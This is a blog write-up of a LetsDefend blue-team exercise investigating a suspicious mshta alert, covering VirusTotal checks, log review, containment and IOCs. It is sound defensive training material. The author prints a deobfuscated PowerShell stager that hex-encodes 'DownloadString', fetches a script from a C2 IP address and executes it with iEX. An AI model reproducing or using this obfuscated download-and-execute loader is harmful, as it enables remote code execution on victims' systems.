---
layout: post
published: true
title: write up - suspicious mshta behavior
author: admin
comments: true
date: '2022-04-13 18:00'
categories:
  - DFIR
---

I've been trying out [letsdefend.io](https://letsdefend.io/) for a couple of week, and here's a write up of one of the challenge. its a platform to hone your blue teaming skill, you play in a SIEM like apps and you act as an analyst, finding IOC and deciding escalation etc. There are not a lot of blue team training site, and this concept is pretty nice. 

Here goes the write up. 
<!--more-->

![mshta behaviour](/images/wup_ld.png)

This is what the case looked like, basically a host execute a hta thus an alert is triggered. Our job is to see what really happened and do the intended playbook exercise. Some things that we can check to help with analysis are the hash (virustotal) and the IP address (we'll try command history & proccess history we found at the endpoint security tab). Afterward we are gonna decide on containment (eradication and recovery) and last the lesson learned from said incident.

#### virustotal

virustotal result are bad, 23/58 malicious flag. you could also try to find the file and do more analysis, but for now I think we can move to endpoint security tabs and do more analysis there.

[virustotal](https://www.virustotal.com/gui/file/886095c7861a068d1ee603c71cb161f256941e802e743fe2161f30013947a2f1/detection)


#### endpoint security

![wup_endpoint](/images/wup_endpoint.png)

We use endpoint security tab to find out what was happening in the host 172.16.17.38. 
The screenshot above is from the command history portion of the tab, where we can see that the first command line that trigger the alert, followed by another not so clear command.

The first command is what triggered the alert. Mshta is a trusted Microsoft binary that in this case is abused for execution of the PS1.hta file. 
you can see the related explanation here at the [MITRE](https://attack.mitre.org/techniques/T1218/005/)

Tried a bit of magic at the second command so it will be more readable. 

```bash
function H1($i) 
{$r = '' ; for ($n = 0; $n -Lt $i.LengtH; $n += 2)
{$r += [cHar][int]('0x' + $i.Substring($n,2))}return $r};
$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));
$H3 = H1 '446f776E';
$H4 = H1 '6C6f';
$H5 = H1 '616473747269';
$H6 = H1 '6E67';
$H7 = $H3+$H4+$H5+$H6;
$H8 = $H2.$H7('http://193.142.58.23/Server.txt');
iEX $H8
```

$H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". 
$H2 was a glorified "New-Object Net.WebClient". 
$H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8 (http://193.142.58.23/Server.txt). 

#### log management

After seeing what the script do, we best check log management and try to see did the c2 server (193.142.58.23) reply with anything.

![wup_endpoint](/images/wup_logmgmt.png)

apparently the server replied with 404, so no response arrived for the host (172.16.17.38) because the server is dead/ the file was not there.

#### containment and lesson learned

Since it's definetly a malicious script (but stopped due to the C2 server is dead), it's best to contain the host. We can do this by going to endpoint security and click the request containment. 

Lastly, we can use the IP address, and URL and also the md5 hash of the executed file can as IOC when we did the playbook and also close the case.



